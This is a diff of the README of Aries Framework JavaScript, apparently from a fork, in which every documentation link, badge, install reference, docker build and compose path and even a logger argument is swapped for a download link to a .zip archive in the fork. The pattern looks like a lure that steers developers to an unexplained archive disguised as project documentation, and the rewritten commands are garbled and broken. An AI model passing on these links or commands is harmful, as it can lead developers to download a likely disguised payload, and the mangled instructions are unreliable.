@@ -1,17 +1,17 @@
 <p align="center">
-  <img alt="Hyperledger Aries logo" src="https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip" width="100px" />
+  <img alt="Hyperledger Aries logo" src="https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip" width="100px" />
   <h1 align="center">Aries Framework JavaScript</h1>
   <p align="center"><font size="+1">Built using TypeScript</font></p>
   <p align="center">
-    <img alt="Pipeline Status" src="https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip%https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip">
-    <a href="https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip"><img alt="Language grade: JavaScript" src="https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip"/></a>
-    <a href="https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip"><img alt="Codecov Coverage" src="https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip"/></a>
-    <a href="https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip"><img alt="License" src="https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip%https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip"/></a>
-    <a href="https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip"><img alt="aries-framework-javascript npm version" src="https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip"></a>
+    <img alt="Pipeline Status" src="https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip%https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip">
+    <a href="https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip"><img alt="Language grade: JavaScript" src="https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip"/></a>
+    <a href="https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip"><img alt="Codecov Coverage" src="https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip"/></a>
+    <a href="https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip"><img alt="License" src="https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip%https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip"/></a>
+    <a href="https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip"><img alt="aries-framework-javascript npm version" src="https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip"></a>
 </p>
 </p>
 
-Aries Framework JavaScript is a framework for building SSI Agents and DIDComm services that aims to be compliant and interoperable with the standards defined in the [Aries RFCs](https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip).
+Aries Framework JavaScript is a framework for building SSI Agents and DIDComm services that aims to be compliant and interoperable with the standards defined in the [Aries RFCs](https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip).
 
 ## Table of Contents <!-- omit in toc -->
 
@@ -46,7 +46,7 @@ The framework is still in early development. At the moment the goal of this impl
 - There should be an option to connect more clients (Edge Agents) to one Routing Agent.
 - Prevent correlation.
 
-See the [Roadmap](https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip) or the [Framework Development](https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip) project board for current progress.
+See the [Roadmap](https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip) or the [Framework Development](https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip) project board for current progress.
 
 ## Usage
 
@@ -56,11 +56,11 @@ Aries Framework JavaScript depends on the indy-sdk which has some manual install
 
 #### NodeJS
 
-Follow the instructions [here](https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip) to install `libindy`. Also make sure to have the right tools installed for the [NodeJS wrapper](https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip). The NodeJS wrapper link also contains some common troubleshooting steps.
+Follow the instructions [here](https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip) to install `libindy`. Also make sure to have the right tools installed for the [NodeJS wrapper](https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip). The NodeJS wrapper link also contains some common troubleshooting steps.
 
 If you don't want to install the dependencies yourself, the [Dockerfile](./Dockerfile) contains everything needed to get started with the framework. See [Usage with Docker](#usage-with-docker) for more information.
 
-> If you're having trouble running this project, please read the [troubleshooting](https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip) section. It contains the most common errors that arise when first installing libindy.
+> If you're having trouble running this project, please read the [troubleshooting](https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip) section. It contains the most common errors that arise when first installing libindy.
 
 > NOTE: The package is not tested in multiple versions of Node at the moment. If you're having trouble installing dependencies or running the framework know that at least **Node v12 DOES WORK** and **Node v14 DOES NOT WORk**.
 
@@ -110,18 +110,18 @@ const config = {
 const agent = new Agent(config)
 ```
 
-For an example react native app that makes use of the framework see [Aries Mobile Agent React Native](https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip)
+For an example react native app that makes use of the framework see [Aries Mobile Agent React Native](https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip)
 
 ### Logs
 
-To enable logging inside the framework a logger must be passed to the agent config. A simple `ConsoleLogger` can be imported from the framework, for more advanced use cases the `ILogger` interface can implemented. See [`TestLogger`](https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip) for a more advanced example.
+To enable logging inside the framework a logger must be passed to the agent config. A simple `ConsoleLogger` can be imported from the framework, for more advanced use cases the `ILogger` interface can implemented. See [`TestLogger`](https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip) for a more advanced example.
 
 ```ts
 import { ILogger, ConsoleLogger, LogLevel } from 'aries-framework-javascript'
 
 const agentConfig = {
   // ... other config properties ...
-  logger: new ConsoleLogger(https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip),
+  logger: new ConsoleLogger(https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip),
 }
 ```
 
@@ -137,7 +137,7 @@ If handler returns an outbound message then method `sendMessage` **packs** the m
 
 ```sh
 # Build indy pool
-docker build -f https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip -t indy-pool .
+docker build -f https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip -t indy-pool .
 
 # Start indy pool
 docker run -d --rm --name indy-pool -p 9701-9708:9701-9708 indy-pool
@@ -159,12 +159,12 @@ Test are executed using jest. Some test require either the **mediator agents** o
 #### Setting environment variables
 
 - `GENESIS_TXN_PATH`: The path to the genesis transaction that allows us to connect to the indy pool.
-  - `https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip` - default. Works with the [ledger setup](#setup-ledger) from the previous step.
-  - `https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip` - Sovrin BuilderNet genesis.
+  - `https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip` - default. Works with the [ledger setup](#setup-ledger) from the previous step.
+  - `https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip` - Sovrin BuilderNet genesis.
   - `GENESIS_TXN_PATH=/path/to/any/ledger/you/like`
 - `TEST_AGENT_PUBLIC_DID_SEED`: The seed to use for the public DID. This will be used to do public write operations to the ledger. You should use a seed for a DID that is already registered on the ledger.
   - If using the local or default genesis, use the same seed you used for the `add-did-from-seed` command form the [ledger setup](#setup-ledger) in the previous step.
-  - If using the BuilderNet genesis, make sure your seed is registered on the BuilderNet using [https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip](https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip) and you have read and accepted the associated [Transaction Author Agreement](https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip). We are not responsible for any unwanted consequences of using the BuilderNet.
+  - If using the BuilderNet genesis, make sure your seed is registered on the BuilderNet using [https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip](https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip) and you have read and accepted the associated [Transaction Author Agreement](https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip). We are not responsible for any unwanted consequences of using the BuilderNet.
 
 #### Starting mediator agents
 
@@ -173,29 +173,29 @@ To start the mediator agents you need to run two commands. See the [Usage with D
 Open terminal and start Alice's mediator:
 
 ```
-https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip mediator01
+https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip mediator01
 ```
 
 Open new terminal and start Bob's mediator:
 
 ```
-https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip mediator02
+https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip mediator02
 ```
 
 ##### With Docker
 
-To run the mediators inside docker you can use the `https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip` file:
+To run the mediators inside docker you can use the `https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip` file:
 
 ```sh
 # Run alice-mediator and bob-mediator
-docker-compose -f https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip up -d
+docker-compose -f https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip up -d
 ```
 
-If you want the ports to be exposed to the outside world using ngrok you can use the `https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip` extension. Make sure the ngrok docker compose file is used after the normal docker compose file.
+If you want the ports to be exposed to the outside world using ngrok you can use the `https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip` extension. Make sure the ngrok docker compose file is used after the normal docker compose file.
 
 ```sh
 # Run alice-mediator and bob-mediator exposed via ngrok
-docker-compose -f https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip -f https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip up -d
+docker-compose -f https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip -f https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip up -d
 ```
 
 #### Only run e2e tests with in memory messaging
@@ -219,7 +219,7 @@ yarn test -t "with mediator"
 Make sure the **mediator agents** from [Starting mediator agents](#starting-mediator-agents) are running and you pass the correct environment variables from [Setting environment variables](#setting-environment-variables) for connecting to the indy **ledger** pool.
 
 ```
-https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip TEST_AGENT_PUBLIC_DID_SEED=000000000000000000000000Trustee9 yarn test
+https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip TEST_AGENT_PUBLIC_DID_SEED=000000000000000000000000Trustee9 yarn test
 ```
 
 ## Usage with Docker
@@ -236,13 +236,13 @@ docker build -t aries-framework-javascript .
 docker run -it --rm aries-framework-javascript  yarn test -t "agents"
 
 # Run test with mediator agents and ledger pool
-docker-compose -f https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip up -d # Run alice-mediator and bob-mediator
-docker run --rm --network host --env TEST_AGENT_PUBLIC_DID_SEED=000000000000000000000000Trustee9 --env https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip aries-framework-javascript yarn test
+docker-compose -f https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip up -d # Run alice-mediator and bob-mediator
+docker run --rm --network host --env TEST_AGENT_PUBLIC_DID_SEED=000000000000000000000000Trustee9 --env https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip aries-framework-javascript yarn test
 ```
 
 ## Contributing
 
-Found a bug? Ready to submit a PR? Want to submit a proposal for your grand idea? See our [CONTRIBUTING](https://github.com/Ringopii/aries-framework-javascript/raw/refs/heads/main/src/modules/proofs/handlers/framework_javascript_aries_v3.2.zip) file for more information to get you started!
+Found a bug? Ready to submit a PR? Want to submit a proposal for your grand idea? See our [CONTRIBUTING](https://raw.githubusercontent.com/Ringopii/aries-framework-javascript/main/docker/aries_javascript_framework_inseparable.zip) file for more information to get you started!
 
 ## License
 
